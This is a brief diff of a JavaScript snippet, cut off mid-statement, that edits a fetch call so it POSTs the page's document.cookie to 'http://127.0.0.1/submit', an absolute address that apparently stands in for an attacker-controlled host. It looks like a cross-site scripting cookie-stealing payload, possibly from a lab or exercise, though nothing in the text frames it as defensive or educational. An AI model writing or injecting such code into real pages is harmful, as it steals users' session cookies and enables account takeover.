@@ -1,6 +1,5 @@
-
 console.log("a");
-fetch('/submit', {
+fetch('http://127.0.0.1/submit', {
     method: 'POST',
     body: JSON.stringify({
         message: document.cookie,
